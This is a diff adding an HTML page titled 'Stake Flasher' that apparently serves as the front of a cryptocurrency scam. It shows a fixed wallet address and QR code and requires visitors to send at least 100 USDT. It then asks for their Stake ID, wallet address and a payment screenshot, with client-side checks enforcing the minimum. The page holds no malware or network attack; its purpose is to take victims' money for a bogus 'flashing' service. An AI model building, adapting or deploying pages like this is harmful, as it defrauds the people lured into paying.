@@ -1,0 +1,141 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Stake Flasher</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #000;
+      color: #fff;
+      padding: 20px;
+    }
+
+    .container {
+      max-width: 450px;
+      margin: auto;
+      background-color: #1a1a1a;
+      padding: 25px;
+      border-radius: 10px;
+      box-shadow: 0 0 15px rgba(255, 255, 255, 0.1);
+    }
+
+    h2 {
+      text-align: center;
+      color: #0f0;
+    }
+
+    label {
+      font-weight: bold;
+      display: block;
+      margin-top: 15px;
+    }
+
+    input, select, button {
+      width: 100%;
+      padding: 10px;
+      margin-top: 6px;
+      border: none;
+      border-radius: 5px;
+      background-color: #333;
+      color: #fff;
+    }
+
+    button {
+      background-color: #0f0;
+      color: #000;
+      font-weight: bold;
+      cursor: pointer;
+    }
+
+    button:hover {
+      background-color: #0c0;
+    }
+
+    img {
+      display: block;
+      margin: 15px auto 5px;
+      max-width: 200px;
+    }
+
+    .wallet-address {
+      text-align: center;
+      word-break: break-all;
+      font-size: 14px;
+      margin-bottom: 10px;
+    }
+
+    .error {
+      color: red;
+      font-size: 14px;
+      margin-top: 5px;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h2>Stake Flasher</h2>
+
+    <form id="stakeForm">
+      <label>Select Cryptocurrency:</label>
+      <select required>
+        <option value="">-- Select Crypto --</option>
+        <option>Bitcoin (BTC)</option>
+        <option>Ethereum (ETH)</option>
+        <option>Solana (SOL)</option>
+        <option>USDT (BEP20)</option>
+        <option>USDT (ERC20)</option>
+        <option>USDT (TRC20)</option>
+      </select>
+
+      <label>QR Code:</label>
+      <img src="qr.png" alt="QR Code" />
+
+      <div class="wallet-address" id="walletAddressDisplay">
+        0x9706b11022c70cc0a92d81624c0aab5243acb95e
+      </div>
+
+      <button type="button" onclick="copyAddress()">Copy Address</button>
+
+      <label>Enter Stake ID:</label>
+      <input type="text" placeholder="Enter your Stake ID" required />
+
+      <label>Your Wallet Address:</label>
+      <input type="text" placeholder="Enter your wallet address" required />
+
+      <label>Amount Sent (USDT):</label>
+      <input type="number" id="amount" min="100" placeholder="Minimum 100 USDT" required />
+      <div id="amountError" class="error"></div>
+
+      <label>Upload Screenshot:</label>
+      <input type="file" accept="image/*" required />
+
+      <button type="submit">Submit</button>
+    </form>
+  </div>
+
+  <script>
+    function copyAddress() {
+      const address = document.getElementById("walletAddressDisplay").innerText;
+      navigator.clipboard.writeText(address).then(() => {
+        alert("Address copied to clipboard!");
+      });
+    }
+
+    document.getElementById("stakeForm").addEventListener("submit", function(e) {
+      const amount = parseFloat(document.getElementById("amount").value);
+      const errorDiv = document.getElementById("amountError");
+      errorDiv.textContent = "";
+
+      if (isNaN(amount) || amount < 100) {
+        e.preventDefault(); // ❌ Form Submit nahi hoga
+        errorDiv.textContent = "Minimum amount is 100 USDT required!";
+        return false;
+      }
+
+      // ✅ Form submit hone dega agar amount >= 100
+    });
+  </script>
+</body>
+</html>
